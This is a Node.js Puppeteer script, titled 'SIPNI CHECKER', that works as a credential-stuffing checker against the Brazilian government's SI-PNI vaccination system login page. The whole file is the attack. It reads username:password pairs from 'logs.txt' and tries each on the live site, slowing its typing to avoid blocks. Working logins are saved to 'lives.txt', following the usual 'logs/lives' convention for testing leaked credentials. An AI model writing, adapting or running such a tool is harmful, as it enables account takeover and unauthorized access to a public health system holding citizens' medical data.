const fs = require("fs");
const puppeteer = require("puppeteer");

// Configuração para Codespaces/GitHub Actions
const puppeteerConfig = {
  headless: "new", // Usar o novo headless
  args: [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--window-size=1920x1080'
  ],
  defaultViewport: null
};

async function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}

async function tentarLogin(usuario, senha, tentativa = 1) {
  const navegador = await puppeteer.launch(puppeteerConfig);
  const page = await navegador.newPage();

  try {
    // Configurar timeout maior para Codespaces
    page.setDefaultNavigationTimeout(90000);
    page.setDefaultTimeout(30000);

    console.log(`  Tentando login: ${usuario} (tentativa ${tentativa})`);
    
    await page.goto("https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf", {
      waitUntil: "networkidle0",
      timeout: 60000
    });

    console.log(`  Página carregada para ${usuario}`);

    // Aguardar elementos com mais tolerância
    try {
      await page.waitForSelector("input[placeholder='Informe o usuário']", { 
        timeout: 15000,
        visible: true 
      });
      await page.waitForSelector("input[placeholder='Informe a senha']", { 
        timeout: 15000,
        visible: true 
      });
    } catch (error) {
      console.log(`  ⚠️  Campos de login não encontrados para ${usuario}`);
      await navegador.close();
      return false;
    }

    // Digitar credenciais com delay maior para evitar bloqueios
    await page.type("input[placeholder='Informe o usuário']", usuario, { delay: 100 });
    await delay(500);
    await page.type("input[placeholder='Informe a senha']", senha, { delay: 100 });
    await delay(500);

    // Tentar encontrar e clicar no botão de submit
    const submitButton = await page.$("button[type='submit']") || 
                         await page.$("input[type='submit']") ||
                         await page.$("button:contains('Entrar')") ||
                         await page.$("input[value='Entrar']");

    if (submitButton) {
      await submitButton.click();
    } else {
      console.log(`  ⚠️  Botão de submit não encontrado para ${usuario}`);
      await navegador.close();
      return false;
    }

    // Aguardar mais tempo para resposta
    await delay(8000);

    // Verificar se há mensagem de erro
    let erro = null;
    try {
      erro = await page.$eval("#errorMessage_container", el => el.innerText).catch(() => null);
    } catch {
      erro = null;
    }

    // Verificar outros indicadores de erro
    if (!erro) {
      const pageContent = await page.content();
      if (pageContent.includes("Usuário ou senha incorreto") || 
          pageContent.includes("usuário não encontrado") ||
          pageContent.includes("senha incorreta")) {
        erro = "Credenciais inválidas";
      }
    }

    // Verificar se login foi bem-sucedido (redirecionamento ou conteúdo específico)
    const currentUrl = await page.url();
    const isLoggedIn = !currentUrl.includes("inicio.jsf") || 
                      (await page.content()).includes("logout") ||
                      (await page.content()).includes("Sair") ||
                      (await page.content()).includes("sair");

    await navegador.close();

    if (erro && erro.includes("Usuário ou senha incorreto")) {
      console.log(`  ❌ Inválido: ${usuario}`);
      return false;
    }

    return isLoggedIn;
  } catch (error) {
    console.log(`  ⚠️  Erro ao testar ${usuario}: ${error.message}`);
    await navegador.close();
    
    // Tentar novamente se for erro de conexão
    if (tentativa < 2 && error.message.includes("timeout")) {
      console.log(`  🔄 Tentando novamente ${usuario}...`);
      return await tentarLogin(usuario, senha, tentativa + 1);
    }
    
    return false;
  }
}

function lerCredenciais(caminho) {
  try {
    if (!fs.existsSync(caminho)) {
      console.log(`Arquivo ${caminho} não encontrado!`);
      console.log("Criando arquivo de exemplo...");
      
      // Criar arquivo de exemplo
      const exemplo = "usuario1:senha1\nusuario2:senha2\nusuario3:senha3";
      fs.writeFileSync(caminho, exemplo);
      console.log(`Arquivo ${caminho} criado com credenciais de exemplo.`);
      console.log("Edite-o com suas credenciais reais.");
      return [];
    }
    
    const conteudo = fs.readFileSync(caminho, "utf8");
    const linhas = conteudo.split('\n');
    const credenciais = [];

    for (let linha of linhas) {
      linha = linha.trim();
      if (linha && !linha.startsWith('#')) { // Ignorar linhas comentadas
        const partes = linha.split(':');
        if (partes.length >= 2) {
          const usuario = partes[0].trim();
          const senha = partes.slice(1).join(':').trim();
          if (usuario && senha) {
            credenciais.push({ usuario, senha });
          }
        }
      }
    }

    console.log(`✓ ${credenciais.length} credenciais carregadas de ${caminho}`);
    return credenciais;
  } catch (error) {
    console.log(`❌ Erro ao ler arquivo ${caminho}: ${error.message}`);
    return [];
  }
}

function salvarLoginValido(usuario, senha, arquivo = "lives.txt") {
  try {
    const linha = `${usuario}:${senha}\n`;
    
    // Verificar se já existe
    let existe = false;
    if (fs.existsSync(arquivo)) {
      const conteudo = fs.readFileSync(arquivo, "utf8");
      existe = conteudo.includes(`${usuario}:${senha}`);
    }
    
    if (!existe) {
      fs.appendFileSync(arquivo, linha, "utf8");
      console.log(`  💾 SALVO: ${usuario}:${senha}`);
      return true;
    } else {
      console.log(`  ⚠️  Já existe: ${usuario}:${senha}`);
      return false;
    }
  } catch (error) {
    console.log(`  ❌ Erro ao salvar: ${error.message}`);
    return false;
  }
}

function mostrarEstatisticas(arquivo = "lives.txt") {
  try {
    if (fs.existsSync(arquivo)) {
      const conteudo = fs.readFileSync(arquivo, "utf8");
      const linhas = conteudo.split('\n').filter(l => l.trim());
      return linhas.length;
    }
    return 0;
  } catch {
    return 0;
  }
}

(async () => {
  console.log("=".repeat(60));
  console.log("🚀 SIPNI CHECKER - GitHub Codespaces");
  console.log("=".repeat(60));
  console.log("📂 Lendo credenciais...");

  const credenciais = lerCredenciais("logs.txt");

  if (credenciais.length === 0) {
    console.log("\n❌ Nenhuma credencial para testar.");
    console.log("👉 Edite o arquivo 'logs.txt' com seus logins no formato:");
    console.log("   usuario1:senha1");
    console.log("   usuario2:senha2");
    return;
  }

  console.log(`\n🔍 Iniciando verificação de ${credenciais.length} credenciais...\n`);
  
  let validos = 0;
  let invalidos = 0;
  let erros = 0;
  const startTime = Date.now();

  for (let i = 0; i < credenciais.length; i++) {
    const c = credenciais[i];
    const percentual = ((i + 1) / credenciais.length * 100).toFixed(1);
    
    console.log(`\n[${i + 1}/${credenciais.length}] ${percentual}%`);
    console.log(`─`.repeat(40));

    try {
      const valido = await tentarLogin(c.usuario, c.senha);
      
      if (valido) {
        console.log(`  🎉 VÁLIDO ENCONTRADO!`);
        salvarLoginValido(c.usuario, c.senha);
        validos++;
      } else {
        invalidos++;
      }
    } catch (error) {
      console.log(`  ⚠️  Erro no processo: ${error.message}`);
      erros++;
    }

    // Pequena pausa para não sobrecarregar
    if (i < credenciais.length - 1) {
      await delay(1000);
    }
  }

  const endTime = Date.now();
  const tempoTotal = ((endTime - startTime) / 1000).toFixed(1);
  const livesSalvos = mostrarEstatisticas();

  console.log("\n" + "=".repeat(60));
  console.log("📊 RELATÓRIO FINAL");
  console.log("=".repeat(60));
  console.log(`✅ Válidos encontrados: ${validos}`);
  console.log(`❌ Inválidos: ${invalidos}`);
  console.log(`⚠️  Erros: ${erros}`);
  console.log(`⏱️  Tempo total: ${tempoTotal} segundos`);
  console.log(`💾 Lives salvos: ${livesSalvos}`);
  console.log("=".repeat(60));

  if (validos > 0) {
    console.log("\n📋 LOGINS VÁLIDOS SALVOS:");
    console.log("─".repeat(40));
    
    try {
      if (fs.existsSync("lives.txt")) {
        const conteudo = fs.readFileSync("lives.txt", "utf8");
        console.log(conteudo);
      }
    } catch (error) {
      console.log("Erro ao ler arquivo lives.txt");
    }
  }

  console.log("\n🎯 Verificação concluída!");
  console.log("Arquivos gerados:");
  console.log("  📄 logs.txt - Suas credenciais (edite este arquivo)");
  console.log("  📄 lives.txt - Logins válidos encontrados");
  console.log("=".repeat(60));
})();
